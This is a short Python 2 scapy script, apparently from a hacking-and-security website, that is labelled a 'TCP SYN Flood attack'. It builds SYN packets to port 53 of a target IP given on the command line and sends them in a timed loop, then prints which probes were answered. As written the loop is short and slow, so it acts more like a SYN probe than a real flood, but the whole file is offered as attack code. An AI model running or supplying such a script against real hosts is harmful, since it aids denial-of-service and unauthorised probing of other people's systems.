#! /usr/bin/env python
# Name : Antonio Taboada
# Website : www.hackingyseguridad.com
# Description : TCP SYN Flood attack
import sys
from scapy.all import *
#conf.verb=0
print "Field Values of packet sent"
p=IP(dst=sys.argv[1],id=1111,ttl=52)/TCP(sport=RandShort(),dport=[53],seq=12345,ack=1000,window=29200,flags="S")/"HaX0r SVP"
ls(p)
print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
print "Summary of answered & unanswered packets"
ans.summary()
unans.summary()
print "source port flags in response"
#for s,r in ans:
# print r.sprintf("%TCP.sport% \t %TCP.flags%")
ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
